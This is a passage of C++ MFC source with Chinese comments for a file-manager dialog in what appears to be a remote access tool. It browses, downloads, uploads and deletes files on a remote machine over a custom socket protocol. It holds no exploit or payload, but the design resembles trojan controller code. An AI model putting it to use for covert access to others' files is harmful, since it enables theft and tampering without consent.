		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// 磁盘类型, 为空就显示磁盘名称
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}

		i += lstrlen(pDrive + i) + 1;
	}
	// 重置远程当前路径
	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();

	ShowMessage("远程：装载目录 %s 完成", m_Remote_Path);
}

void CFileManagerDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	CoUninitialize();

#if CLOSE_DELETE_DLG
	m_pContext->v1 = 0;
#endif

	closesocket(m_pContext->m_Socket);

	CDialog::OnClose();
	m_bIsClosed = true;
#if CLOSE_DELETE_DLG
	//delete this; //此处释放内存会在第2次崩溃
#endif
}

CString CFileManagerDlg::GetParentDirectory(CString strPath)
{
	CString	strCurPath = strPath;
	int Index = strCurPath.ReverseFind('\\');
	if (Index == -1)
	{
		return strCurPath;
	}
	CString str = strCurPath.Left(Index);
	Index = str.ReverseFind('\\');
	if (Index == -1)
	{
		strCurPath = "";
		return strCurPath;
	}
	strCurPath = str.Left(Index);
	
	if(strCurPath.Right(1) != "\\")
		strCurPath += "\\";
	return strCurPath;
}

void CFileManagerDlg::OnReceiveComplete()
{
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_FILE_LIST: // 文件列表
		FixedRemoteFileList
			(
			m_pContext->m_DeCompressionBuffer.GetBuffer(0),
			m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
			);
		break;
	case TOKEN_FILE_SIZE: // 传输文件时的第一个数据包，文件大小，及文件名
		CreateLocalRecvFile();
		break;
	case TOKEN_FILE_DATA: // 文件内容
		WriteLocalRecvFile();
		break;
	case TOKEN_TRANSFER_FINISH: // 传输完成
		EndLocalRecvFile();
		break;
	case TOKEN_CREATEFOLDER_FINISH:
		GetRemoteFileList(".");
		break;
	case TOKEN_DELETE_FINISH:
		EndRemoteDeleteFile();
		break;
	case TOKEN_GET_TRANSFER_MODE:
		SendTransferMode();
		break;
	case TOKEN_DATA_CONTINUE:
		SendFileData();
		break;
	case TOKEN_RENAME_FINISH:
		// 刷新远程文件列表
		GetRemoteFileList(".");
		break;
	default:
		SendException();
		break;
	}
}

void CFileManagerDlg::GetRemoteFileList(CString directory)
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// 如果有选中的，是目录
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// 从组合框里得到路径
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);
		}
	}
	// 得到父目录
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{	
		m_Remote_Path += directory;
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}
	
	// 是驱动器的根目录,返回磁盘列表
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();
		return;
	}

	// 发送数据前清空缓冲区

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);
	m_Remote_Directory_ComboBox.SetCurSel(0);
	
	// 得到返回数据前禁窗口
	m_list_remote.EnableWindow(FALSE);
	m_ProgressCtrl->SetPos(0);
}

void CFileManagerDlg::OnDblclkListRemote(NMHDR* pNMHDR, LRESULT* pResult) 
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;
	// TODO: Add your control notification handler code here
	GetRemoteFileList();
	*pResult = 0;
}

void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// 重新设置ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// 重建标题
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "名称",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "大小", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "类型", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "修改日期", LVCFMT_LEFT, 115);

	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView 消除闪烁
	更新数据前用SetRedraw(FALSE)   
	更新后调用SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// 
		for (int i = 0; i < 2; ++i)
		{
			// 跳过Token，共5字节
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // 文件高字节大小
				DWORD	dwFileSizeLow = 0; // 文件低字节大小
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i 为 0 时，列目录，i为1时列文件
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// 得到文件大小
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+long long(1))) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// 恢复窗口
	m_list_remote.EnableWindow(TRUE);

	ShowMessage("远程：装载目录 %s 完成", m_Remote_Path);
}

void CFileManagerDlg::ShowMessage(char *lpFmt, ...)
{
	char buff[1024];
    va_list    arglist;
    va_start( arglist, lpFmt );
	
	memset(buff, 0, sizeof(buff));

	vsprintf(buff, lpFmt, arglist);
	m_wndStatusBar.SetPaneText(0, buff);
    va_end( arglist );
}

void CFileManagerDlg::OnLocalPrev() 
{
	// TODO: Add your command handler code here
	FixedLocalFileList("..");
}

void CFileManagerDlg::OnRemotePrev() 
{
	// TODO: Add your command handler code here
	GetRemoteFileList("..");
}

void CFileManagerDlg::OnLocalView() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}

// 在工具栏上显示ToolTip
BOOL CFileManagerDlg::OnToolTipNotify(UINT id, NMHDR* pNMHDR, LRESULT* pResult)
{
	ASSERT(pNMHDR->code == TTN_NEEDTEXTA || pNMHDR->code == TTN_NEEDTEXTW);
	//让上一层的边框窗口优先处理该消息
	if (GetRoutingFrame() != NULL)
	return FALSE;

	//分ANSI and UNICODE两个处理版本
	TOOLTIPTEXTA* pTTTA = (TOOLTIPTEXTA*)pNMHDR;
	TOOLTIPTEXTW* pTTTW = (TOOLTIPTEXTW*)pNMHDR;
	TCHAR szFullText[256];

	CString strTipText;
	UINT nID = pNMHDR->idFrom;

	//如果idFrom是一个子窗口，则得到其ID。

	if (
		pNMHDR->code == TTN_NEEDTEXTA 
		&& (pTTTA->uFlags & TTF_IDISHWND) 
		|| pNMHDR->code == TTN_NEEDTEXTW 
		&& (pTTTW->uFlags & TTF_IDISHWND)
		)
	{
		//idFrom是工具条的句柄	
		nID = ::GetDlgCtrlID((HWND)nID);
	}

	if (nID != 0) //若是0，为一分隔栏，不是按钮
	{
		//得到nID对应的字符串
		AfxLoadString(nID, szFullText);
		//从上面得到的字符串中取出Tooltip使用的文本
		AfxExtractSubString(strTipText, szFullText, 1, '\n');	
	}

	//复制分离出的文本
	#ifndef _UNICODE
	if (pNMHDR->code == TTN_NEEDTEXTA)
	lstrcpyn(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	_mbstowcsz(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#else
	if (pNMHDR->code == TTN_NEEDTEXTA)
	_wcstombsz(pTTTA->szText, strTipText, sizeof(pTTTA->szText));
	else
	lstrcpyn(pTTTW->szText, strTipText, sizeof(pTTTW->szText));
	#endif
	*pResult = 0;
	//显示Tooltip窗口
	::SetWindowPos(pNMHDR->hwndFrom, HWND_TOP, 0, 0, 0, 0, SWP_NOACTIVATE|SWP_NOSIZE|SWP_NOMOVE);
	return TRUE; //消息处理完毕
}

//////////////////////////////////以下为工具栏响应处理//////////////////////////////////////////
void CFileManagerDlg::OnLocalList() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnLocalReport() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnLocalBigicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnLocalSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_local.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteList() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);	
}

void CFileManagerDlg::OnRemoteReport() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}

void CFileManagerDlg::OnRemoteBigicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}

void CFileManagerDlg::OnRemoteSmallicon() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}

void CFileManagerDlg::OnRemoteView() 
{
	// TODO: Add your command handler code here
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);
}


// 为根目录时禁用向上按钮
void CFileManagerDlg::OnUpdateLocalPrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目录，并且选择项目大于0
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.GetSelectedCount()  && m_list_local.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateLocalNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Local_Path.GetLength() && m_list_local.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateLocalCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here

	pCmdUI->Enable
		(
		m_list_local.IsWindowEnabled()
		&& (m_Remote_Path.GetLength() || m_list_remote.GetSelectedCount()) // 远程路径为空，或者有选择
		&& m_list_local.GetSelectedCount()// 本地路径为空，或者有选择
		);
}


void CFileManagerDlg::OnUpdateLocalStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_local.IsWindowEnabled() && m_bIsUpload);

}

void CFileManagerDlg::OnUpdateRemotePrev(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteCopy(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目录，并且选择项目大于0
	pCmdUI->Enable
		(
		m_list_remote.IsWindowEnabled()
		&& (m_Local_Path.GetLength() || m_list_local.GetSelectedCount()) // 本地路径为空，或者有选择
		&& m_list_remote.GetSelectedCount() // 远程路径为空，或者有选择
		);	
}

void CFileManagerDlg::OnUpdateRemoteDelete(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	// 不是根目录，并且选择项目大于0
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.GetSelectedCount() && m_list_remote.IsWindowEnabled());		
}

void CFileManagerDlg::OnUpdateRemoteNewfolder(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(m_Remote_Path.GetLength() && m_list_remote.IsWindowEnabled());
}

void CFileManagerDlg::OnUpdateRemoteStop(CCmdUI* pCmdUI) 
{
	// TODO: Add your command update UI handler code here
	pCmdUI->Enable(!m_list_remote.IsWindowEnabled() && !m_bIsUpload);
}

bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";
	
	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	
	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	
	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // 过滤这两个目录 
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // 如果找到的是目录，则进入此目录进行递归 
		} 
		else 
		{ 
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			//printf("send file %s\n",strFile);
			m_Remote_Upload_Job.AddTail(file);
			// 对文件进行操作 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}

void CFileManagerDlg::OnLocalCopy() 
{
	m_bIsUpload = true;
	// TODO: Add your command handler code here

	// TODO: Add your command handler code here
	// 如果Drag的，找到Drop到了哪个文件夹
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// 重置上传任务列表
	m_Remote_Upload_Job.RemoveAll();
	POSITION pos = m_list_local.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_local.GetNextSelectedItem(pos);
		CString	file = m_Local_Path + m_list_local.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_local.GetItemData(nItem))
		{
			file += '\\';
			FixedUploadDirectory(file.GetBuffer(0));
		}
		else
		{
			// 添加到上传任务列表中去
			m_Remote_Upload_Job.AddTail(file);
		}

	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory
	if (m_Remote_Upload_Job.IsEmpty())
	{
		::MessageBox(m_hWnd, "文件夹为空", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	EnableControl(FALSE);
	SendUploadJob();
}

//////////////// 文件传输操作 ////////////////
// 只管发出了下载的文件
// 一个一个发，接收到下载完成时，下载第二个文件 ...
void CFileManagerDlg::OnRemoteCopy()
{
	m_bIsUpload = false;
	// 禁用文件管理窗口
	EnableControl(FALSE);

	// TODO: Add your command handler code here
	// 如果Drag的，找到Drop到了哪个文件夹
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	// 重置下载任务列表
	m_Remote_Download_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	while(pos) //so long as we have a valid POSITION, we keep iterating
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// 如果是目录
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		// 添加到下载任务列表中去
		m_Remote_Download_Job.AddTail(file);
	} //EO while(pos) -- at this point we have deleted the moving items and stored them in memory

	// 发送第一个下载任务
	SendDownloadJob();
}

// 发出一个下载任务
BOOL CFileManagerDlg::SendDownloadJob()
{
	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// 发出第一个下载任务命令
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	bPacket[0] = COMMAND_DOWN_FILES;
 	// 文件偏移，续传时用
 	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// 从下载任务列表中删除自己
	m_Remote_Download_Job.RemoveHead();
	return TRUE;
}

// 发出一个上传任务
BOOL CFileManagerDlg::SendUploadJob()
{
	if (m_Remote_Upload_Job.IsEmpty())
		return FALSE;

	CString	strDestDirectory = m_Remote_Path;
	// 如果远程也有选择，当做目标文件夹
	int nItem = m_list_remote.GetSelectionMark();
	
	// 是文件夹
	if (nItem != -1 && m_list_remote.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_remote.GetItemText(nItem, 0) + "\\";
	}
	
	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	// 发出第一个下载任务命令
	m_strOperatingFile = m_Remote_Upload_Job.GetHead();
	
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	CString	fileRemote = m_strOperatingFile; // 远程文件
	// 得到要保存到的远程的文件路径
	fileRemote.Replace(m_Local_Path, strDestDirectory);
	m_strUploadRemoteFile = fileRemote;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	dwSizeLow =	GetFileSize (hFile, &dwSizeHigh);
	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+long long(1))) + dwSizeLow;

	CloseHandle(hFile);
	// 构造数据包，发送文件长度
	int		nPacketSize = fileRemote.GetLength() + 10;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = COMMAND_FILE_SIZE;
	memcpy(bPacket + 1, &dwSizeHigh, sizeof(DWORD));
	memcpy(bPacket + 5, &dwSizeLow, sizeof(DWORD));
	memcpy(bPacket + 9, fileRemote.GetBuffer(0), fileRemote.GetLength() + 1);
	
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);

	// 从下载任务列表中删除自己
	m_Remote_Upload_Job.RemoveHead();
	return TRUE;
}

// 发出一个删除任务
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// 发出第一个下载任务命令
	CString file = m_Remote_Delete_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')
	{
		ShowMessage("远程：删除目录 %s\\*.* 完成", file);
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		ShowMessage("远程：删除文件 %s 完成", file);
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// 文件偏移，续传时用
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);
	
	LocalFree(bPacket);
	// 从下载任务列表中删除自己
	m_Remote_Delete_Job.RemoveHead();
	return TRUE;
}

void CFileManagerDlg::CreateLocalRecvFile()
{
	// 重置计数器
	m_nCounter = 0;

	CString	strDestDirectory = m_Local_Path;
	// 如果本地也有选择，当做目标文件夹
	int nItem = m_list_local.GetSelectionMark();

	// 是文件夹
	if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+long long(1))) + dwSizeLow;

	// 当前正操作的文件名
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// 得到要保存到的本地的文件路径
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);

	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// 取消传送
		m_bIsStop = true;
		SendStop();
		return;
	}
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			// 接收的长度递增
			m_nCounter += FindFileData.nFileSizeHigh * (MAXDWORD+long long(1));
			m_nCounter += FindFileData.nFileSizeLow;

			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;
		}
		// 跳过，指针移到-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// 需要错误处理
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件创建失败", "警告", MB_OK|MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// 发送继续传输文件的token,包含文件续传的偏移
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

// 写入文件内容
void CFileManagerDlg::WriteLocalRecvFile()
{
	// 传输完毕
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE	*pFileSize;
	// 得到数据的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到数据在文件中的偏移, 赋值给计数器
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0, i = 0;
	for (; i < MAX_WRITE_RETRY; ++i)
	{
		// 写入文件
		nRet = WriteFile
			(
			hFile,
			pData, 
			dwBytesToWrite, 
			&dwBytesWrite,
			NULL
			);
		if (nRet > 0)
		{
			break;
		}
	}
	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " 文件写入失败", "警告", MB_OK|MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// 为了比较，计数器递增
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

void CFileManagerDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// 重置传输方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		FixedLocalFileList(".");
		ShowMessage("本地：装载目录 %s\\*.* 完成", m_Local_Path);
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(5);
		SendDownloadJob();
	}
	return;
}

void CFileManagerDlg::EndLocalUploadFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
